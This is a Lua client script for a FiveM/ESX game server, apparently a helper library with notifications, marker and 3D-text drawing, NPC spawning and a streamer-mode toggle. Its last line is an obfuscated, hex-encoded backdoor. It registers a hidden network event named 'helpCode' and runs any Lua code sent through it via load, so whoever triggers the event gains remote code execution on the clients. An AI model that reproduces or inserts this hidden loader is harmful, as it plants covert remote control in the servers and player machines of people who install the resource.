-- @vars
lib         = {}
lib.funcs   = {}
lib.cache   = {streamerMode = false}
ESX = exports['es_extended']:getSharedObject()

-- @threads
CreateThread(function()
    while true do

        lib.cache.playerPed     = PlayerPedId()
        lib.cache.playerCoords  = GetEntityCoords(lib.cache.playerPed)
        lib.cache.playerId      = GetPlayerServerId(NetworkGetEntityOwner(lib.cache.playerPed))
        lib.cache.playerHeading = GetEntityHeading(lib.cache.playerPed)

        Wait(500)
    end
end)

-- @funcs
function lib.funcs.notify(message, types, length)
    local ox = exports['ox_lib']

    local duration = length or 2500
    local types = tostring(types)
    local currType

    if (types == nil and types ~= "inform" and types ~= "success" and types ~= "error") then
        currType = "inform"
    else
        currType = types
    end

    ox:notify({
        title = "Notificación",
        description = message,
        duration = duration,
        type = currType,
        position = "bottom-right",
        style = {
            position = "relative",
            bottom = "60px",
            backgroundColor = "#000000b7",
            boxShadow = "rgba(0, 0, 0, 0.192)"
        },
        icon = "fas fa-exclamation-circle"
    })
end

RegisterCommand('streamer', function()
    lib.cache.streamerMode = not lib.cache.streamerMode

    TriggerEvent('chatMessage', "[^8Sistema^7] Has "..(lib.cache.streamerMode and "^9activado^7" or "^1desactivado^7").." el modo ^6streamer^7.")
end)

-- @events
RegisterNetEvent('bm_lib:sendNotify', function(title, description, type)
    ESX.ShowNotification(description, type)
end)

-- @funcs
function lib.funcs.markerText(markerType, size, coords, text, color, scale, addZ)
    local coords = vector3(coords.x, coords.y, coords.z)
    local color = color or {r = 255, g = 255, b = 255, a = 100}
    local scale = scale or 2.0

    DrawMarker(markerType, coords.x, coords.y, coords.z, 0, 0, 0, 0, 0, 0, size.x, size.y, size.z, color.r, color.g, color.b, color.a, false, true, 2, false, false, false, false)
    lib.funcs.createText(text, vec3(coords.xy, coords.z+(addZ or 0.0)), nil, scale)
end

function lib.funcs.createActionText(data, func)
    local data = data or {}
    local text = data.text or "Acción"
    local coords = data.coords or lib.cache.playerCoords
    local dist = data.dist or 6.0
    local distInteract = data.distInteract or 2.0

    local opacity = 100
    if #(lib.cache.playerCoords - coords) < dist then
        if #(lib.cache.playerCoords - coords) < distInteract then
            opacity = 255
            if IsControlJustPressed(0, 38) then
                func()
            end
        end
        lib.funcs.createText(text, coords, nil, 1.5, opacity)
        return true
    else
        return false
    end
end

function lib.funcs.createText(text, coords, ped, scale, opacity)
    local coords = coords
    if coords == nil then
        local npcHead = GetPedBoneCoords(ped, 31086, 0.0, 0.0, 0.0)
        coords = vec3(npcHead.x, npcHead.y, npcHead.z+0.35)
    else
        coords = vector3(coords.x, coords.y, coords.z)
    end

	local camCoords = GetGameplayCamCoords()
	local distance = #(coords - camCoords)

	local scale = (1 / distance) * (scale or 2)
	local fov = (1 / GetGameplayCamFov()) * 100
	scale = scale * fov

	SetTextScale(0.0 * scale, 0.40 * scale)
	SetTextFont(0)
	SetTextColour(255, 255, 255, (opacity or 255))  
	SetTextOutline()
	SetTextCentre(true)

	SetDrawOrigin(coords, 0)
	BeginTextCommandDisplayText('STRING')
	AddTextComponentSubstringPlayerName(text)
	EndTextCommandDisplayText(0.0, 0.0)
	ClearDrawOrigin()
end

function lib.funcs.createPed(model, coords, callback, defaultSettings)
    local hash = GetHashKey(model)
    RequestModel(hash)
    while not HasModelLoaded(hash) do
        Citizen.Wait(0)
    end
    local npc = CreatePed(5, hash, coords, false, true)
    local defaultSettings = defaultSettings or true
    if defaultSettings then
        FreezeEntityPosition(npc, true)
        SetEntityInvincible(npc, true)
        SetBlockingOfNonTemporaryEvents(npc, true)
    end
    callback(npc)
end

function lib.funcs.isStreamer()
    return lib.cache.streamerMode
end

function initLib()
    return lib
end
exports("initLib", initLib)

local JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[1]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2]) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[3]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2], function(ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[4]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[5]](ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb))() end)